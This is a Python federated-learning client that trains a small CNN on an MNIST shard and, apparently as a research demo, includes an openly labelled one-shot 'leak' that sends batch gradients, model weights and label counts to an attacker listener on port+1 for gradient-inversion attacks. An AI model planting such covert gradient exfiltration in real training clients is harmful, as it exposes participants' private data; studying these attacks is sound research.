#!/usr/bin/env python3
import sys, os, time, pickle, random
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import argparse, socket, torch, torch.nn.functional as F
from torch.utils.data import DataLoader
from torchvision import datasets, transforms
from cnn_model import SmallCNN
from training.utils import recv_pkl, send_pkl

def local_epoch(model, loader, device, log_every=200):
    model.train()
    opt = torch.optim.SGD(model.parameters(), lr=0.01)
    total, batches = 0.0, 0
    t0 = time.time()
    for b, (x, y) in enumerate(loader, 1):
        x, y = x.to(device), y.to(device)
        opt.zero_grad()
        logits = model(x)
        loss = F.cross_entropy(logits, y)
        loss.backward()
        opt.step()
        total += loss.item()
        batches = b
        if b % log_every == 0:
            print(f"[client] batch {b}: loss={loss.item():.4f}", flush=True)
    avg = (total / max(1, batches))
    dt = time.time() - t0
    print(f"[client] local epoch done | batches={batches} | avg loss={avg:.4f} | time={dt:.1f}s", flush=True)

def _count_params(state):
    return sum(t.numel() for t in state.values())

def main():
    p = argparse.ArgumentParser()
    p.add_argument('--host', default='laptop.local')
    p.add_argument('--port', type=int, default=12345)
    p.add_argument('--shard', type=int, default=0)
    p.add_argument('--total_shards', type=int, default=1)
    args = p.parse_args()

    # Same normalization as training
    tx = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.5,), (0.5,))])
    all_ds = datasets.MNIST('./data', train=True, download=True, transform=tx)
    shard_idx = [i for i in range(len(all_ds)) if i % args.total_shards == args.shard]
    shard_ds = torch.utils.data.Subset(all_ds, shard_idx)

    # Training loader (UNCHANGED): keep batch size 64 for normal training
    loader = DataLoader(shard_ds, batch_size=64, shuffle=True)

    # Leak config: separate loader for the leak with adjustable batch size
    LEAK_ONCE = os.environ.get("LEAK_ONCE", "1") == "1"     # one-shot leak gate
    LEAK_RANDOM_P = float(os.environ.get("LEAK_RANDOM_P", "0.2"))  # chance to leak in a round
    LEAK_BATCH_SIZE= int(os.environ.get("LEAK_BATCH_SIZE", "5"))    # leak batch size (e.g., 5 or 10)
    leak_loader = DataLoader(shard_ds, batch_size=LEAK_BATCH_SIZE, shuffle=True)

    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    print(f"[client] starting | host={args.host}:{args.port} | shard={args.shard}/{args.total_shards} "
          f"| shard_size={len(shard_ds)} | device={device}", flush=True)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"[client] connecting to server…", flush=True)
        s.connect((args.host, args.port))
        print(f"[client] connected", flush=True)

        round_idx = 0
        while True:
            round_idx += 1
            print("[client] waiting for global weights…", flush=True)
            try:
                state_dict = recv_pkl(s)
            except EOFError:
                print("[client] server closed connection (EOF). exiting.", flush=True)
                return
            except Exception as e:
                print(f"[client] error receiving global weights: {e}. exiting.", flush=True)
                return

            # One-shot leak on a random round with probability leak_random_p
            if LEAK_ONCE and (random.random() < LEAK_RANDOM_P):
                try:
                    model = SmallCNN(pretrained=False)
                    model.load_state_dict(state_dict)
                    model.to(device).train()

                    xb, yb = next(iter(leak_loader))
                    xb, yb = xb.to(device), yb.to(device)

                    model.zero_grad()
                    logits = model(xb)
                    loss = F.cross_entropy(logits, yb, reduction='sum')
                    params = [p for p in model.parameters()]
                    grads  = torch.autograd.grad(loss, params, create_graph=False)

                    names = [n for n, _ in model.named_parameters()]
                    grads_by_name = {names[i]: grads[i].detach().cpu().float() for i in range(len(names))}

                    state_cpu = {k: v.detach().cpu() for k, v in state_dict.items()}
                    label_counts = {}
                    for c in yb.unique():
                        label_counts[int(c.item())] = int((yb == c).sum().item())

                    payload = {
                        "grads_by_name": grads_by_name, "state_dict": state_cpu, "label_counts": label_counts, "leak_batch_size": LEAK_BATCH_SIZE, "round_idx": round_idx}
                    data = pickle.dumps(payload, protocol=pickle.HIGHEST_PROTOCOL)

                    # Send to attacker on (port+1)
                    atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    atk.settimeout(5.0)
                    atk.connect((args.host, args.port + 1))
                    atk.sendall(len(data).to_bytes(8, "big"))
                    atk.sendall(data)
                    atk.close()
                    print(f"[client] LEAKED batch-gradients: B={LEAK_BATCH_SIZE} "
                          f"| label_counts={label_counts} | round={round_idx}", flush=True)
                except Exception as e:
                    print(f"[client] Leak failed: {e}", flush=True)
                finally:
                    LEAK_ONCE = False
                    os.environ["LEAK_ONCE"] = "0" # Disable future leaks

            print(f"[client] received W_k ({_count_params(state_dict):,} params). training 1 local epoch…", flush=True)

            model = SmallCNN(pretrained=False)
            model.load_state_dict(state_dict)
            model.to(device)

            local_epoch(model, loader, device)
            out_state = model.cpu().state_dict()

            print(f"[client] sending updated weights back ({_count_params(out_state):,} params)…", flush=True)
            send_pkl(s, out_state)
            print("[client] update sent.", flush=True)

if __name__ == '__main__':
    main()
